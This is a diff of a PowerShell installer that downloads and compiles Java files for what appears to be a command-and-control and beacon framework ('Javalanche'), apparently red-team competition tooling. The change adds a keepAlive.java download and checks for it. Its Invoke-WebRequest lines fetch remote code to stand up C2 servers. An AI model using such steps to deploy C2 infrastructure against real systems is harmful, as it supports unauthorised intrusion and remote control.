@@ -60,6 +60,7 @@ Invoke-WebRequest -Uri "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/mai
 Invoke-WebRequest -Uri "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/Beacon/BeaconClientHandler.java?ref_type=heads" -OutFile "C:\Javalanche\Servers\Beacon\BeaconClientHandler.java"
 Invoke-WebRequest -Uri "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/Beacon/BeaconServer.java?ref_type=heads" -OutFile "C:\Javalanche\Servers\Beacon\BeaconServer.java"
 Invoke-WebRequest -Uri "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/Duplexer.java?ref_type=heads" -OutFile "C:\Javalanche\Servers\Duplexer.java"
+Invoke-WebRequest -Uri "https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Servers/keepAlive.java?ref_type=heads" -OutFile "C:\Javalanche\Servers\keepAlive.java"
 
 $testOne = Test-Path "C:\Javalanche\Servers\C2\C2Server.java"
 $testTwo = Test-Path "C:\Javalanche\Servers\C2\C2ServerBeaconHandler.java"
@@ -68,8 +69,9 @@ $testFour = Test-Path "C:\Javalanche\Servers\Beacon\BeaconC2Handler.java"
 $testFive = Test-Path "C:\Javalanche\Servers\Beacon\BeaconClientHandler.java"
 $testSix = Test-Path "C:\Javalanche\Servers\Beacon\BeaconServer.java"
 $testSeven = Test-Path "C:\Javalanche\Servers\Duplexer.java"
+$testEight = Test-Path "C:\Javalanche\Servers\keepAlive.java"
 
-if($testOne -eq "True" -and $testTwo -eq "True" -and $testThree -eq "True" -and $testFour -eq "True" -and $testFive -eq "True" -and $testSix -eq "True" -and $testSeven -eq "True"){
+if($testOne -eq "True" -and $testTwo -eq "True" -and $testThree -eq "True" -and $testFour -eq "True" -and $testFive -eq "True" -and $testSix -eq "True" -and $testSeven -eq "True" -and $testEight -eq "True"){
     Write-Host "[" -NoNewline; Write-Host "SUCESS" -ForegroundColor Green -NoNewline; Write-Host "] Java Files downloaded" -ForegroundColor White
 } else {
     Write-Host "[" -NoNewline; Write-Host "ERROR" -ForegroundColor Red -NoNewline; Write-Host "] Java Files could not be downloaded" -ForegroundColor White
@@ -94,8 +96,9 @@ $testFour = Test-Path "C:\Javalanche\Servers\Beacon\BeaconC2Handler.class"
 $testFive = Test-Path "C:\Javalanche\Servers\Beacon\BeaconClientHandler.class"
 $testSix = Test-Path "C:\Javalanche\Servers\Beacon\BeaconServer.class"
 $testSeven = Test-Path "C:\Javalanche\Servers\Duplexer.class"
+$testEight = Test-Path "C:\Javalanche\Servers\keepAlive.class"
 
-if($testOne -eq "True" -and $testTwo -eq "True" -and $testThree -eq "True" -and $testFour -eq "True" -and $testFive -eq "True" -and $testSix -eq "True" -and $testSeven -eq "True"){
+if($testOne -eq "True" -and $testTwo -eq "True" -and $testThree -eq "True" -and $testFour -eq "True" -and $testFive -eq "True" -and $testSix -eq "True" -and $testSeven -eq "True" -and $testEight -eq "True"){
     Write-Host "[" -NoNewline; Write-Host "SUCESS" -ForegroundColor Green -NoNewline; Write-Host "] Java Files Compiled" -ForegroundColor White
 } else {
     Write-Host "[" -NoNewline; Write-Host "ERROR" -ForegroundColor Red -NoNewline; Write-Host "] Java Files could not be compiled" -ForegroundColor White
